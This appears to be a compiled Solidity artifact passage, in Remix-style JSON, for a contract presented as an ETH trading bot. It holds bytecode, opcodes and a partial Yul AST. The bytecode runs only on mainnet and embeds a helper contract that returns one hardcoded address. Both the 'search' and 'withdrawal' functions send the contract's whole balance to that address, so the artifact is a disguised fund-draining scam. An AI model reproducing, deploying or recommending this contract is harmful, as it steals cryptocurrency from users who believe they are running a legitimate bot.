{
	"deploy": {
		"VM:-": {
			"linkReferences": {},
			"autoDeployLib": true
		},
		"main:1": {
			"linkReferences": {},
			"autoDeployLib": true
		},
		"ropsten:3": {
			"linkReferences": {},
			"autoDeployLib": true
		},
		"rinkeby:4": {
			"linkReferences": {},
			"autoDeployLib": true
		},
		"kovan:42": {
			"linkReferences": {},
			"autoDeployLib": true
		},
		"goerli:5": {
			"linkReferences": {},
			"autoDeployLib": true
		},
		"Custom": {
			"linkReferences": {},
			"autoDeployLib": true
		}
	},
	"data": {
		"bytecode": {
			"functionDebugData": {
				"@_36": {
					"entryPoint": null,
					"id": 36,
					"parameterSlots": 0,
					"returnSlots": 0
				}
			},
			"generatedSources": [],
			"linkReferences": {},
			"object": "608060405234801561000f575f80fd5b506001461461001c575f80fd5b60405161002890610086565b604051809103905ff080158015610041573d5f803e3d5ffd5b5060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610093565b6101b0806103eb83390190565b61034b806100a05f395ff3fe608060405260043610610037575f3560e01c806389350daa146100425780639763d29b1461004c578063d4e93292146100745761003e565b3661003e57005b5f80fd5b61004a61007e565b005b348015610057575f80fd5b50610072600480360381019061006d9190610265565b610151565b005b61007c61015b565b005b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b39797046040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100e8573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061010c91906102ea565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561014e573d5f803e3d5ffd5b50565b8060028190555050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ef36a7f26040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101c5573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101e991906102ea565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561022b573d5f803e3d5ffd5b50565b5f80fd5b5f819050919050565b61024481610232565b811461024e575f80fd5b50565b5f8135905061025f8161023b565b92915050565b5f6020828403121561027a5761027961022e565b5b5f61028784828501610251565b91505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6102b982610290565b9050919050565b6102c9816102af565b81146102d3575f80fd5b50565b5f815190506102e4816102c0565b92915050565b5f602082840312156102ff576102fe61022e565b5b5f61030c848285016102d6565b9150509291505056fea2646970667358221220e0cd2b33fc411d7be872486f6040a05dffe2905d16f01429908c893a046723a064736f6c63430008140033608060405234801561000f575f80fd5b506101938061001d5f395ff3fe608060405234801561000f575f80fd5b506004361061004a575f3560e01c80630c0f93a11461004e578063b397970414610058578063ef36a7f214610076578063f1bb461d14610094575b5f80fd5b6100566100b2565b005b6100606100b4565b60405161006d9190610144565b60405180910390f35b61007e6100cf565b60405161008b9190610144565b60405180910390f35b61009c6100ea565b6040516100a99190610144565b60405180910390f35b565b5f7371f6bb4a6e7a6e9c4dba1aafddcc8f2ab275539f905090565b5f7371f6bb4a6e7a6e9c4dba1aafddcc8f2ab275539f905090565b5f7371f6bb4a6e7a6e9c4dba1aafddcc8f2ab275539f905090565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61012e82610105565b9050919050565b61013e81610124565b82525050565b5f6020820190506101575f830184610135565b9291505056fea2646970667358221220f060456643f512bc8c18c9335144ce555298876b35d4df33d9c4b12747437c9e64736f6c63430008140033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 CHAINID EQ PUSH2 0x1C JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x28 SWAP1 PUSH2 0x86 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x41 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x93 JUMP JUMPDEST PUSH2 0x1B0 DUP1 PUSH2 0x3EB DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH2 0x34B DUP1 PUSH2 0xA0 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x89350DAA EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x9763D29B EQ PUSH2 0x4C JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x74 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH2 0x7E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x57 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x72 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6D SWAP2 SWAP1 PUSH2 0x265 JUMP JUMPDEST PUSH2 0x151 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x7C PUSH2 0x15B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB3979704 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xE8 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x10C SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x14E JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xEF36A7F2 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C5 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1E9 SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x22B JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x244 DUP2 PUSH2 0x232 JUMP JUMPDEST DUP2 EQ PUSH2 0x24E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x25F DUP2 PUSH2 0x23B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x27A JUMPI PUSH2 0x279 PUSH2 0x22E JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x287 DUP5 DUP3 DUP6 ADD PUSH2 0x251 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2B9 DUP3 PUSH2 0x290 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C9 DUP2 PUSH2 0x2AF JUMP JUMPDEST DUP2 EQ PUSH2 0x2D3 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2E4 DUP2 PUSH2 0x2C0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2FF JUMPI PUSH2 0x2FE PUSH2 0x22E JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x30C DUP5 DUP3 DUP6 ADD PUSH2 0x2D6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE0 0xCD 0x2B CALLER 0xFC COINBASE SAR PUSH28 0xE872486F6040A05DFFE2905D16F01429908C893A046723A064736F6C PUSH4 0x43000814 STOP CALLER PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x193 DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4A JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0xB3979704 EQ PUSH2 0x58 JUMPI DUP1 PUSH4 0xEF36A7F2 EQ PUSH2 0x76 JUMPI DUP1 PUSH4 0xF1BB461D EQ PUSH2 0x94 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x56 PUSH2 0xB2 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x60 PUSH2 0xB4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6D SWAP2 SWAP1 PUSH2 0x144 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7E PUSH2 0xCF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8B SWAP2 SWAP1 PUSH2 0x144 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x9C PUSH2 0xEA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x144 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH0 PUSH20 0x71F6BB4A6E7A6E9C4DBA1AAFDDCC8F2AB275539F SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH20 0x71F6BB4A6E7A6E9C4DBA1AAFDDCC8F2AB275539F SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH20 0x71F6BB4A6E7A6E9C4DBA1AAFDDCC8F2AB275539F SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x12E DUP3 PUSH2 0x105 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13E DUP2 PUSH2 0x124 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x157 PUSH0 DUP4 ADD DUP5 PUSH2 0x135 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE PUSH1 0x45 PUSH7 0x43F512BC8C18C9 CALLER MLOAD PREVRANDAO 0xCE SSTORE MSTORE SWAP9 DUP8 PUSH12 0x35D4DF33D9C4B12747437C9E PUSH5 0x736F6C6343 STOP ADDMOD EQ STOP CALLER ",
			"sourceMap": "643:12249:0:-:0;;;820:94;;;;;;;;;;870:1;853:13;:18;845:27;;;;;;893:13;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;883:7;;:23;;;;;;;;;;;;;;;;;;643:12249;;;;;;;;;;:::o;:::-;;;;;;;"
		},
		"deployedBytecode": {
			"functionDebugData": {
				"@SetTradeBalanceETH_134": {
					"entryPoint": 337,
					"id": 134,
					"parameterSlots": 1,
					"returnSlots": 0
				},
				"@_40": {
					"entryPoint": null,
					"id": 40,
					"parameterSlots": 0,
					"returnSlots": 0
				},
				"@search_690": {
					"entryPoint": 126,
					"id": 690,
					"parameterSlots": 0,
					"returnSlots": 0
				},
				"@withdrawal_925": {
					"entryPoint": 347,
					"id": 925,
					"parameterSlots": 0,
					"returnSlots": 0
				},
				"abi_decode_t_address_fromMemory": {
					"entryPoint": 726,
					"id": null,
					"parameterSlots": 2,
					"returnSlots": 1
				},
				"abi_decode_t_uint256": {
					"entryPoint": 593,
					"id": null,
					"parameterSlots": 2,
					"returnSlots": 1
				},
				"abi_decode_tuple_t_address_fromMemory": {
					"entryPoint": 746,
					"id": null,
					"parameterSlots": 2,
					"returnSlots": 1
				},
				"abi_decode_tuple_t_uint256": {
					"entryPoint": 613,
					"id": null,
					"parameterSlots": 2,
					"returnSlots": 1
				},
				"allocate_unbounded": {
					"entryPoint": null,
					"id": null,
					"parameterSlots": 0,
					"returnSlots": 1
				},
				"cleanup_t_address": {
					"entryPoint": 687,
					"id": null,
					"parameterSlots": 1,
					"returnSlots": 1
				},
				"cleanup_t_uint160": {
					"entryPoint": 656,
					"id": null,
					"parameterSlots": 1,
					"returnSlots": 1
				},
				"cleanup_t_uint256": {
					"entryPoint": 562,
					"id": null,
					"parameterSlots": 1,
					"returnSlots": 1
				},
				"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
					"entryPoint": null,
					"id": null,
					"parameterSlots": 0,
					"returnSlots": 0
				},
				"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
					"entryPoint": 558,
					"id": null,
					"parameterSlots": 0,
					"returnSlots": 0
				},
				"validator_revert_t_address": {
					"entryPoint": 704,
					"id": null,
					"parameterSlots": 1,
					"returnSlots": 0
				},
				"validator_revert_t_uint256": {
					"entryPoint": 571,
					"id": null,
					"parameterSlots": 1,
					"returnSlots": 0
				}
			},
			"generatedSources": [
				{
					"ast": {
						"nodeType": "YulBlock",
						"src": "0:1890:11",
						"statements": [
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "47:35:11",
									"statements": [
										{
											"nodeType": "YulAssignment",
											"src": "57:19:11",
											"value": {
												"arguments": [
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "73:2:11",
														"type": "",
														"value": "64"
													}
												],
												"functionName": {
													"name": "mload",
													"nodeType": "YulIdentifier",
													"src": "67:5:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "67:9:11"
											},
											"variableNames": [
												{
													"name": "memPtr",
													"nodeType": "YulIdentifier",
													"src": "57:6:11"
												}
											]
										}
									]
								},
								"name": "allocate_unbounded",
								"nodeType": "YulFunctionDefinition",
								"returnVariables": [
									{
										"name": "memPtr",
										"nodeType": "YulTypedName",
										"src": "40:6:11",
										"type": ""
									}
								],
								"src": "7:75:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "177:28:11",
									"statements": [
										{
											"expression": {
												"arguments": [
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "194:1:11",
														"type": "",
														"value": "0"
													},
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "197:1:11",
														"type": "",
														"value": "0"
													}
												],
												"functionName": {
													"name": "revert",
													"nodeType": "YulIdentifier",
													"src": "187:6:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "187:12:11"
											},
											"nodeType": "YulExpressionStatement",
											"src": "187:12:11"
										}
									]
								},
								"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
								"nodeType": "YulFunctionDefinition",
								"src": "88:117:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "300:28:11",
									"statements": [
										{
											"expression": {
												"arguments": [
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "317:1:11",
														"type": "",
														"value": "0"
													},
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "320:1:11",
														"type": "",
														"value": "0"
													}
												],
												"functionName": {
													"name": "revert",
													"nodeType": "YulIdentifier",
													"src": "310:6:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "310:12:11"
											},
											"nodeType": "YulExpressionStatement",
											"src": "310:12:11"
										}
									]
								},
								"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
								"nodeType": "YulFunctionDefinition",
								"src": "211:117:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "379:32:11",
									"statements": [
										{
											"nodeType": "YulAssignment",
											"src": "389:16:11",
											"value": {
												"name": "value",
												"nodeType": "YulIdentifier",
												"src": "400:5:11"
											},
											"variableNames": [
												{
													"name": "cleaned",
													"nodeType": "YulIdentifier",
													"src": "389:7:11"
												}
											]
										}
									]
								},
								"name": "cleanup_t_uint256",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "value",
										"nodeType": "YulTypedName",
										"src": "361:5:11",
										"type": ""
									}
								],
								"returnVariables": [
									{
										"name": "cleaned",
										"nodeType": "YulTypedName",
										"src": "371:7:11",
										"type": ""
									}
								],
								"src": "334:77:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "460:79:11",
									"statements": [
										{
											"body": {
												"nodeType": "YulBlock",
												"src": "517:16:11",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"kind": "number",
																	"nodeType": "YulLiteral",
																	"src": "526:1:11",
																	"type": "",
																	"value": "0"
																},
																{
																	"kind": "number",
																	"nodeType": "YulLiteral",
																	"src": "529:1:11",
																	"type": "",
																	"value": "0"
																}
															],
															"functionName": {
																"name": "revert",
																"nodeType": "YulIdentifier",
																"src": "519:6:11"
															},
															"nodeType": "YulFunctionCall",
															"src": "519:12:11"
														},
														"nodeType": "YulExpressionStatement",
														"src": "519:12:11"
													}
												]
											},
											"condition": {
												"arguments": [
													{
														"arguments": [
															{
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "483:5:11"
															},
															{
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "508:5:11"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "490:17:11"
																},
																"nodeType": "YulFunctionCall",
																"src": "490:24:11"
															}
														],
														"functionName": {
															"name": "eq",
															"nodeType": "YulIdentifier",
															"src": "480:2:11"
														},
														"nodeType": "YulFunctionCall",
														"src": "480:35:11"
													}
												],
												"functionName": {
													"name": "iszero",
													"nodeType": "YulIdentifier",
													"src": "473:6:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "473:43:11"
											},
											"nodeType": "YulIf",
											"src": "470:63:11"
										}
									]
								},
								"name": "validator_revert_t_uint256",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "value",
										"nodeType": "YulTypedName",
										"src": "453:5:11",
										"type": ""
									}
								],
								"src": "417:122:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "597:87:11",
									"statements": [
										{
											"nodeType": "YulAssignment",
											"src": "607:29:11",
											"value": {
												"arguments": [
													{
														"name": "offset",
														"nodeType": "YulIdentifier",
														"src": "629:6:11"
													}
												],
												"functionName": {
													"name": "calldataload",
													"nodeType": "YulIdentifier",
													"src": "616:12:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "616:20:11"
											},
											"variableNames": [
												{
													"name": "value",
													"nodeType": "YulIdentifier",
													"src": "607:5:11"
												}
											]
										},
										{
											"expression": {
												"arguments": [
													{
														"name": "value",
														"nodeType": "YulIdentifier",
														"src": "672:5:11"
													}
												],
												"functionName": {
													"name": "validator_revert_t_uint256",
													"nodeType": "YulIdentifier",
													"src": "645:26:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "645:33:11"
											},
											"nodeType": "YulExpressionStatement",
											"src": "645:33:11"
										}
									]
								},
								"name": "abi_decode_t_uint256",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "offset",
										"nodeType": "YulTypedName",
										"src": "575:6:11",
										"type": ""
									},
									{
										"name": "end",
										"nodeType": "YulTypedName",
										"src": "583:3:11",
										"type": ""
									}
								],
								"returnVariables": [
									{
										"name": "value",
										"nodeType": "YulTypedName",
										"src": "591:5:11",
										"type": ""
									}
								],
								"src": "545:139:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "756:263:11",
									"statements": [
										{
											"body": {
												"nodeType": "YulBlock",
												"src": "802:83:11",
												"statements": [
													{
														"expression": {
															"arguments": [],
															"functionName": {
																"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																"nodeType": "YulIdentifier",
																"src": "804:77:11"
															},
															"nodeType": "YulFunctionCall",
															"src": "804:79:11"
														},
														"nodeType": "YulExpressionStatement",
														"src": "804:79:11"
													}
												]
											},
											"condition": {
												"arguments": [
													{
														"arguments": [
															{
																"name": "dataEnd",
																"nodeType": "YulIdentifier",
																"src": "777:7:11"
															},
															{
																"name": "headStart",
																"nodeType": "YulIdentifier",
																"src": "786:9:11"
															}
														],
														"functionName": {
															"name": "sub",
															"nodeType": "YulIdentifier",
															"src": "773:3:11"
														},
														"nodeType": "YulFunctionCall",
														"src": "773:23:11"
													},
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "798:2:11",
														"type": "",
														"value": "32"
													}
												],
												"functionName": {
													"name": "slt",
													"nodeType": "YulIdentifier",
													"src": "769:3:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "769:32:11"
											},
											"nodeType": "YulIf",
											"src": "766:119:11"
										},
										{
											"nodeType": "YulBlock",
											"src": "895:117:11",
											"statements": [
												{
													"nodeType": "YulVariableDeclaration",
													"src": "910:15:11",
													"value": {
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "924:1:11",
														"type": "",
														"value": "0"
													},
													"variables": [
														{
															"name": "offset",
															"nodeType": "YulTypedName",
															"src": "914:6:11",
															"type": ""
														}
													]
												},
												{
													"nodeType": "YulAssignment",
													"src": "939:63:11",
													"value": {
														"arguments": [
															{
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "974:9:11"
																	},
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "985:6:11"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "970:3:11"
																},
																"nodeType": "YulFunctionCall",
																"src": "970:22:11"
															},
															{
																"name": "dataEnd",
																"nodeType": "YulIdentifier",
																"src": "994:7:11"
															}
														],
														"functionName": {
															"name": "abi_decode_t_uint256",
															"nodeType": "YulIdentifier",
															"src": "949:20:11"
														},
														"nodeType": "YulFunctionCall",
														"src": "949:53:11"
													},
													"variableNames": [
														{
															"name": "value0",
															"nodeType": "YulIdentifier",
															"src": "939:6:11"
														}
													]
												}
											]
										}
									]
								},
								"name": "abi_decode_tuple_t_uint256",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "headStart",
										"nodeType": "YulTypedName",
										"src": "726:9:11",
										"type": ""
									},
									{
										"name": "dataEnd",
										"nodeType": "YulTypedName",
										"src": "737:7:11",
										"type": ""
									}
								],
								"returnVariables": [
									{
										"name": "value0",
										"nodeType": "YulTypedName",
										"src": "749:6:11",
										"type": ""
									}
								],
								"src": "690:329:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "1070:81:11",
									"statements": [
										{
											"nodeType": "YulAssignment",
											"src": "1080:65:11",
											"value": {
												"arguments": [
													{
														"name": "value",
														"nodeType": "YulIdentifier",
														"src": "1095:5:11"
													},
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "1102:42:11",
														"type": "",
														"value": "0xffffffffffffffffffffffffffffffffffffffff"
													}
												],
												"functionName": {
													"name": "and",
													"nodeType": "YulIdentifier",
													"src": "1091:3:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "1091:54:11"
											},
											"variableNames": [
												{
													"name": "cleaned",
													"nodeType": "YulIdentifier",
													"src": "1080:7:11"
												}
											]
										}
									]
								},
								"name": "cleanup_t_uint160",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "value",
										"nodeType": "YulTypedName",
										"src": "1052:5:11",
										"type": ""
									}
								],
								"returnVariables": [
									{
										"name": "cleaned",
										"nodeType": "YulTypedName",
										"src": "1062:7:11",
										"type": ""
									}
								],
								"src": "1025:126:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "1202:51:11",
									"statements": [
										{
											"nodeType": "YulAssignment",
											"src": "1212:35:11",
											"value": {
												"arguments": [
													{
														"name": "value",
														"nodeType": "YulIdentifier",
														"src": "1241:5:11"
													}
												],
												"functionName": {
													"name": "cleanup_t_uint160",
													"nodeType": "YulIdentifier",
													"src": "1223:17:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "1223:24:11"
											},
											"variableNames": [
												{
													"name": "cleaned",
													"nodeType": "YulIdentifier",
													"src": "1212:7:11"
												}
											]
										}
									]
								},
								"name": "cleanup_t_address",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "value",
										"nodeType": "YulTypedName",
										"src": "1184:5:11",
										"type": ""
									}
								],
								"returnVariables": [
									{
										"name": "cleaned",
										"nodeType": "YulTypedName",
										"src": "1194:7:11",
										"type": ""
									}
								],
								"src": "1157:96:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "1302:79:11",
									"statements": [
										{
											"body": {
												"nodeType": "YulBlock",
												"src": "1359:16:11",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"kind": "number",
																	"nodeType": "YulLiteral",
																	"src": "1368:1:11",
																	"type": "",
																	"value": "0"
																},
																{
																	"kind": "number",
																	"nodeType": "YulLiteral",
																	"src": "1371:1:11",
																	"type": "",
																	"value": "0"
																}
															],
															"functionName": {
																"name": "revert",
																"nodeType": "YulIdentifier",
																"src": "1361:6:11"
															},
															"nodeType": "YulFunctionCall",
															"src": "1361:12:11"
														},
														"nodeType": "YulExpressionStatement",
														"src": "1361:12:11"
													}
												]
											},
											"condition": {
												"arguments": [
													{
														"arguments": [
															{
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1325:5:11"
															},
															{
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1350:5:11"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "1332:17:11"
																},
																"nodeType": "YulFunctionCall",
